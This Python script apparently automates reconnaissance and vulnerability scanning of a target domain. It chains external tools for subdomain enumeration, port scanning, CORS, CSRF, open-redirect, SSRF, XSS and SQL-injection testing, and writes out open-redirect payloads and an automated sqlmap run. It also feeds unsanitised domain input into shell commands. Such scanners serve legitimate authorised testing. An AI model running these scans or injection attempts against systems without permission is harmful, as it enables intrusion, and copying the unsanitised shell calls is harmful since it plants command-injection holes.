import os
import subprocess
import sys
from pathlib import Path
from datetime import datetime

# Define colors for output
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RED = "\033[91m"
NORMAL = "\033[0m"
BOLD = "\033[1m"

def banner(message):
    print(f"{BOLD}{GREEN}[*] {message}{NORMAL}\n")

def run_command(command, output_file=None):
    """Executes a shell command and writes output to a file if specified."""
    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        if output_file:
            with open(output_file, 'a') as f:
                f.write(result.stdout)
        else:
            print(result.stdout)
    except Exception as e:
        print(f"{GREEN}[!] Error executing command: {command}\n{e}{NORMAL}")

def passive_recon(domain, output_dir):
    """Passive reconnaissance phase."""
    banner("STARTING PASSIVE RECONNAISSANCE")
    run_command(f"whois {domain}", output_file=output_dir / "whois.txt")
    run_command(f"dig {domain}", output_file=output_dir / "dns_records.txt")
    run_command(f"dnsrecon -d {domain}", output_file=output_dir / "dnsrecon.txt")
    run_command(f"subfinder -d {domain}", output_file=output_dir / "subdomains.txt")

def active_recon(domain, output_dir):
    """Active reconnaissance phase."""
    banner("STARTING ACTIVE RECONNAISSANCE")
    ip_address = subprocess.getoutput(f"dig +short {domain}")
    print(f"{BOLD}{GREEN}[*] TARGET IP ADDRESS: {YELLOW}{ip_address}{NORMAL}\n")
    run_command(f"nmap -sS -T4 -Pn {domain}", output_file=output_dir / "nmap_scan.txt")
    run_command(f"whatweb {domain}", output_file=output_dir / "whatweb.txt")

def vulnerability_scan(domain, output_dir, notify):
    """Vulnerability scanning phase."""
    banner("STARTING VULNERABILITY SCAN")

    domain_url = f"https://{domain}"
    
    # Missing headers
    print(f"\n{GREEN}[+] Vulnerability: Missing headers{NORMAL}\n{CYAN}Checking security headers...{NORMAL}\n")
    run_command(f"python3 ~/tools/shcheck/shcheck.py {domain_url} | tee {output_dir}/headers.txt")

    # Email spoofing
    print(f"\n{GREEN}[+] Vulnerability: Email spoofing {NORMAL}\n{CYAN}Checking SPF and DMARC records...{NORMAL}\n")
    run_command(f"mailspoof -d {domain} | tee {output_dir}/spoof.json")

    # Subdomain takeover
    print(f"\n{GREEN}[+] Vulnerability: Subdomain takeover {NORMAL}\n{CYAN}Checking if sub-domain points to an unused service...{NORMAL}\n")
    run_command(f"subjack -d {domain} -ssl -v | tee {output_dir}/takeover.txt")

    # CORS misconfigurations
    print(f"\n{GREEN}[+] Vulnerability: CORS{NORMAL}\n{CYAN}Checking CORS misconfigurations...{NORMAL}\n")
    run_command(f"python3 ~/tools/Corsy/corsy.py -u {domain_url} | tee {output_dir}/cors.txt")

    # 403 bypass
    print(f"\n{GREEN}[+] Vulnerability: 403 bypass{NORMAL}\n{CYAN}Gathering endpoints that return 403 status...{NORMAL}\n")
    endpoints_403 = output_dir / "endpoints_403.txt"
    run_command(f"sudo dirsearch -u {domain_url} --random-agent --include-status 403 -w $dictionary --format plain -o {endpoints_403}")

    print(f"\n{CYAN}Attempting 403 status code bypass...{NORMAL}\n")
    with open(endpoints_403, 'r') as f:
        for url in f:
            endpoint = url.strip().split(domain, 1)[-1]
            if endpoint:
                run_command(f"python3 ~/tools/403bypass/4xx.py {domain_url} {endpoint} | tee -a {output_dir}/bypass403.txt")

    # CSRF/XSRF
    print(f"\n{GREEN}[+] Vulnerability: CSRF/XSRF {NORMAL}\n{CYAN}Checking for CSRF/XSRF misconfigurations...{NORMAL}\n")
    run_command(f"python3 ~/tools/Bolt/bolt.py -u {domain_url} -l 2 | tee {output_dir}/csrf.txt")

    # Open Redirect
    print(f"\n{GREEN}[+] Vulnerability: Open Redirect{NORMAL}\n{CYAN}Searching for Open Redirect vulnerabilities...{NORMAL}\n")
    open_redirect_file = output_dir / "or_urls.txt"
    run_command(f"gau {domain} | gf redirect archive | qsreplace | tee {open_redirect_file}")
    for payload in ["https://google.com", "//google.com/", "//\\google.com"]:
        run_command(f"cat {open_redirect_file} | qsreplace '{payload}' | httpx -silent -status-code -location")

    # SSRF
    print(f"\n{GREEN}[+] Vulnerability: SSRF{NORMAL}\n{CYAN}Looking for SSRF vulnerabilities...{NORMAL}\n")
    run_command(f"findomain -t {domain} | httpx -silent -threads 1000 | gau | grep '=' | qsreplace $burpCollaborator | tee {output_dir}/ssrf.txt")

    # XSS
    print(f"\n{GREEN}[+] Vulnerability: XSS{NORMAL}\n{CYAN}Looking for XSS vulnerabilities...{NORMAL}\n")
    run_command(f"gau {domain} | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe -o {output_dir}/xss.txt")

    # SQL Injection
    print(f"\n{GREEN}[+] Vulnerability: SQLi{NORMAL}\n{CYAN}Checking for SQL Injection vulnerabilities...{NORMAL}\n")
    run_command(f"gau {domain} | gf sqli | tee {output_dir}/sqli_parameters.txt")
    run_command(f"sqlmap -m {output_dir}/sqli_parameters.txt --batch --random-agent --level 1 | tee -a {output_dir}/sqli.txt")

    # Multiple Vulnerabilities (Nuclei)
    print(f"\n{GREEN}[+] Vulnerability: Multiple vulnerabilities {NORMAL}\n{CYAN}Running Nuclei templates for multiple vulnerabilities...{NORMAL}\n")
    run_command(f"nuclei -u {domain} -t ~/tools/nuclei-templates/ -severity low,medium,high,critical -silent -o {output_dir}/multiple_vulnerabilities.txt")

    # Notification of results
    if notify:
        print(f"\n{GREEN}[+] Sending notifications for results {NORMAL}\n")
        for file_name in ["headers.txt", "spoof.json", "takeover.txt", "cors.txt", "bypass403.txt", "csrf.txt", "or_urls.txt", "ssrf.txt", "xss.txt", "sqli.txt", "multiple_vulnerabilities.txt"]:
            file_path = output_dir / file_name
            if file_path.exists():
                run_command(f"cat {file_path} | notify -silent")

def main():
    if len(sys.argv) < 2:
        print(f"{RED}[!] No target domain provided. Usage: python recon_vuln_scanner.py <domain> [notify]{NORMAL}")
        sys.exit(1)

    domain = sys.argv[1]
    notify = sys.argv[2].lower() == "true" if len(sys.argv) > 2 else False

    output_dir = Path("targets") / domain
    output_dir.mkdir(parents=True, exist_ok=True)

    passive_recon(domain, output_dir)
    active_recon(domain, output_dir)
    vulnerability_scan(domain, output_dir, notify)

if __name__ == "__main__":
    main()
